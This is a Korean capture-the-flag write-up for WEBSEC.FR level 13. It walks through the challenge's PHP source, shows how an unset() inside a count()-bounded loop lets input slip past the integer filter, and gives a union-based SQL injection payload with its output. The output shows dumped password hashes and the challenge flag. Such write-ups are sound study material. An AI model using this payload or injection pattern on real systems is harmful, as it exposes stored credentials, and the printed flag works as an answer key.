# WEBSEC.FR Level 13

## SQLite Init

Sqlite 의 테이블 초기화 부분이다.

0.admin의 패스워드를 flag로 설정하는 것을 알 수 있다.

```php
<?php

// Defines $flag
include 'flag.php';

$db = new PDO('sqlite::memory:');
$db->exec('CREATE TABLE users (
  user_id   INTEGER PRIMARY KEY,
  user_name TEXT NOT NULL,
  user_privileges INTEGER NOT NULL,
  user_password TEXT NOT NULL
)');

$db->prepare("INSERT INTO users VALUES(0, 'admin', 0, '$flag');")->execute();

for($i=1; $i<25; $i++) {
  $pass = md5(uniqid());
  $user = "user_" . substr(crc32($pass), 0, 2);
  $db->prepare("INSERT INTO users VALUES($i, '$user', 1, '$pass');")->execute();
}
?>
```

즉 우리는 admin의 패스워드를 구해와야한다.



## Get DataBase

```php
<?php
if (isset($_GET['ids']))
{
    if (!is_string($_GET['ids']))
    {
        die("Don't be silly.");
    }

    if (strlen($_GET['ids']) > 70)
    {
        die("Please don't check all the privileges at once.");
    }

    $tmp = explode(',', $_GET['ids']);
    for ($i = 0;$i < count($tmp);$i++)
    {
        $tmp[$i] = (int)$tmp[$i];
        if ($tmp[$i] < 1)
        {
            unset($tmp[$i]);
        }
    }

    $selector = implode(',', array_unique($tmp));

    $query = "SELECT user_id, user_privileges, user_name
  FROM users
  WHERE (user_id in (" . $selector . "));";

    $stmt = $db->query($query);

    echo '<br>';
    echo '<div class="well">';
    echo '<ul>';
    while ($row = $stmt->fetch(\PDO::FETCH_ASSOC))
    {
        echo "<li>";
        echo "User <em>" . $row['user_name'] . "</em>";
        echo "    with id <code>" . $row['user_id'] . '</code>';
        echo " has <b>" . ($row['user_privileges'] == 0 ? "all" : "no") . "</b> privileges.";
        echo "</li>\n";
    }
    echo "</ul>";
    echo "</div>";
}
?>

```

여기서 가장 주목해야 할 부분은 tmp를 explode하는 부분과 아래의 for문이다.

```php
    $tmp = explode(',', $_GET['ids']);
    for ($i = 0;$i < count($tmp);$i++)
    {
        $tmp[$i] = (int)$tmp[$i];
        if ($tmp[$i] < 1)
        {
            unset($tmp[$i]);
        }
    }
```

여기서 `unset()` 은 Stack에서의 pop과 같은 역할을 함으로써 결과적으로 tmp배열의 길이를 하나씩 줄여주어 `for` 문이 돌아갈 횟수를 결과적으로 줄이게 된다.(`count()`) 

따라서 `union select`  문을 사용하여 user_password칼럼의 값을 가져오려면 앞부분에 comma 4개를 찍어줌으로써 뒤에서 꼭필요한 comma3개를 무시할 수 있게된다.



## exploit

```
,,,,)) union select user_password,2,3 from users--
```





## Result

```html
    User 3	with id 30454dedfc9741f09ebc08bab463c5f1 has no privileges.
    User 3	with id 3c68f348c4e0c4e7fe0dd4b1932ee748 has no privileges.
    User 3	with id 4d4030b8bc6948522e877d4da9daf231 has no privileges.
    User 3	with id 4e16769ee2a91a978dbfacdf2e8ed261 has no privileges.
    User 3	with id 5034b3b5871e57410dd9f4f9a18f8d79 has no privileges.
    User 3	with id 5e8c3596f59f132d33da6c7d047ac2e7 has no privileges.
    User 3	with id 617897b6ae6068f215bd8a0470f160ac has no privileges.
    User 3	with id 65515b65160b151fb523efca3662a50d has no privileges.
    User 3	with id 7b062632041afbc55e59b869d7777db1 has no privileges.
    User 3	with id 87a939ba464154a23b54639a3b574c7b has no privileges.
    User 3	with id 88a2afd79b320b366b777e6231a7228b has no privileges.
    User 3	with id 9f0866eb68d938395c18dbc79dcbbbb6 has no privileges.
    User 3	with id WEBSEC{SQL_injection_in_your_cms,_made_simple} has no privileges.
    User 3	with id a2e95fadbbd56125d1c8c8075aed060f has no privileges.
    User 3	with id a5b3fcdb0d029f5f046d4245f8116492 has no privileges.
    User 3	with id b0dd02f434053fa1d0bfa65d94edb003 has no privileges.
    User 3	with id cc733578957a12f1b0da8c2a7e2eb873 has no privileges.
    User 3	with id d3dab7d34d4a6a479029dd7eda958532 has no privileges.
    User 3	with id d5d838d6e5a0fedda41613ea44e14467 has no privileges.
    User 3	with id de5e0c884144d213a21cb43a98a4520f has no privileges.
    User 3	with id e0aa54d26b0a2af1faaf3786582d23f1 has no privileges.
    User 3	with id e8386623363bc8cf2c0f58e9e94e0f1b has no privileges.
    User 3	with id ecf59c586b2ba9c457db1eed1340107c has no privileges.
    User 3	with id f142b8bd99cf880a74fc223a9ede4ae9 has no privileges.
    User 3	with id f721e50629fc44abfb3f2058579405e5 has no privileges.
```

